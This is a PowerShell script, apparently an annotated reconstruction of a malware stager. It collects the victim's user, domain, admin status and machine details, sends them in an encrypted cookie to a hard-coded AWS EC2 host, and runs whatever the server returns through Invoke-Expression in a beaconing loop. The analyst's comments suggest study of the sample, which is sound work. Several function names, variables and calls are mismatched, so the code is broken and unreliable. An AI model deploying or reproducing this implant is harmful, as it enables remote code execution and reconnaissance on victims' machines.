$urls = "http://ec2-54-91-111-47.compute-1.amazonaws.com:4455"
$downloadFolder = ""
$url = ""
$h = "" 


function cam($key, $iv) {
    try{
        $encryptionAlgo = New-Object System.Security.Cryptography.RijndaelManaged
    } catch {
        $encryptionAlgo = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    }

    $encryptionAlgo.mode = [System.Security.Cryptography.CipherMode]::CBC
    $encryptionAlgo.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $encryptionAlgo.BlockSize = 128
    $encryptionAlgo.KeySize = 256

    # When decrypting
    if ($iv) {
        if ((iv.getType()).name -eq "String") {
            $encryptionAlgo.IV = [System.Convert]::FromBase64String($iv)
        } else {
            $encryptionAlgo.IV
        }
    }

    # When Encrypting
    if ($key) {
        if (($key.getType()).name -eq "String") {
            $encryptionAlgo.Key = [System.Convert]::FromBase64String($key)
        } else {
            $encryptionAlgo.Key = $key
        }
    }
    
    $encryptionAlgo
}


function encrypt($key, $content) {
    $contentBytes = ([System.Text.Encoding]::ASCII).GetByteCount($content)
    $encryptionProvider = cam $key
    $encryptor = $encryptionProvider.createEncryptor()
    $finalBlock = $encryptor.transformFinalBlock($contentBytes, 0, $contentBytes.length)
    [byte[]]$encryptedContent = $encryptionProvider.iv + $finalBlock
    [System.Convert]::ToBase64String($p)
}

function decrypt($key, $encryptedContent) {
    $contentBytes = [System.Convert]::FromBase64String($encryptedContent)
    $iv = $contentBytes[(0..15)]
    $encryptionProvider = cam $key $iv
    $decryptor = $encryptionProvider.createDecryptor()
    $finalBlock = $decryptor.transformFinalBlock($contentBytes, 16, $contentBytes.length,-16)
    ([System.Text.Encoding]::ASCII).GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::ASCII).getString($finalBlock)).trim("\x00"))
}

function getWebClient($cookie) {
    $currentDate = Get-Date -Format "yyyy-MM-dd"
    $currentDate = [datetime]::ParseExact($currentDate, "yyyy-MM-dd", $null)
    $futureDate = [datetime]::ParseExact("2999-12-01", "yyyy-MM-dd", $null)

    # Stop after December 01, 2999?
    if ($futureDate -lt $currentDate) {
        exit
    }

    $proxyUsername = ""
    $proxyPassword = ""
    $proxyURL = ""

    $webClient = New-Object System.Net.WebClient
    if ($h -and $PSVersionTable.CLRVersion.Major -gt 2) {
        ($webClient.Headers).add("Host", "")
    }

    # What does this line do?
    ("", {
        $Script:s = "https://$($h)/putil/2018/0/11/po.html"
        $Script:url = "https://$($h)"
    })

    ($webClient.Headers).Add("User-Agent", "Mozilla/5.0 ...") # add full User-Agent here
    ($webClient.Headers).Add("Referer", "")

    if($proxyURL) {
        $webProxy = New-Object System.Net.WebProxy $proxyURL, $true
        if ($username -and $password) {
            # what is PSS - ProxySecureString?
            $pss = ConverTo-SecureString "" -AsPlainText -Force # is password supposed to be here?
            $getCredentials = New-Object System.Management.Automation.PSCredential $proxyUsername $pss
            $webProxy.Credentials = $getCredentials
        } else {
            $webClient.UseDefaultCredentials = $true
        }
        $webClient.Proxy = $webProxy
    } else {
        $webClient.UseDefaultCredentials = $true
        $webClient.Proxy.Credentials = $webClient.Credentials
    }

    if ($cookie) {
        ($webClient.Headers).add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
    }
    $webClient
}

function primern($url, $uri, $downloadFolder) {
    $Script:s = $url + $uri
    $script:url = $url
    $script:h = $downloadFolder

    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $workGroupPolicy = New-Object System.Security.Principal.WindowsPrincipal $currentUser
    $adminGroup = [System.Security.Principal.WindowsBuiltInRole]::Administrator
    $proccessName = (Get-Process -id 1337).ProcessName

    # Checking if user is an admin
    if ($workGroupPolicy.IsInRole($adminGroup)) {
        $elevation = "*"
    } else {
        $elevation = ""
    }

    try {
        $user = $currentUser.Name + $elevation
    } catch {
        if ($env:USERNAME -eq "$($env:COMPUTERNAME)$") {}
        else {
            $user = $env:USERNAME
        }
    }

    $cookie = "$env:USERDOMAIN;$user;$env:COMPUTERNAME;$env:PROCESSOR_ARCHITECTURE;$pid;$processName;1"
    try {
        $encryptedCookie = encryptor -key dxqyeq  csvjd1yvy3kcorzsri67qfnseujgpz0lbaca  -content $cookie
    } catch {
        $encryptedCookie = "ERROR"
    }

    $primern = (getWebClient -cookie $encryptedCookie).DownloadString($Script:s)
    $decryptedCookie = decryptor -key dxqyeq  csvjd1yvy3kcorzsri67qfnseujgpz0lbaca  -content $primern

    if($decryptedCookie -like "*key*") {
        $decryptedCookie | Invoke-Expression
    }
}

function primer {
    if (![string]::IsNullOrEmpty("") -and !([environment]::UserDomainName).contains("")) {
        return
    }

    foreach ($url in $urls) {
        $index = [array]::IndexOf("http://ec2-54-91-111-47.compute-1.amazonaws.com:4455", $urls)
        try {
            primern $url "/putil/2018/0/11/po.html/" $downloadFolder[$index]
        } catch {
            Write-Output $Error[0]
        }
    }
}

# Attempt the Connection 31 times
$limit = 30
if ($true) {
    $wait = 60
    while ($true -and $limit -gt 0) {
        $limit = $limit - 1
        primers
        Start-Sleep 60 # was wait supposed be here?
        $wait = $wait * 2
    }
} else { # Call primers function one last time
    primers 
}


# EOF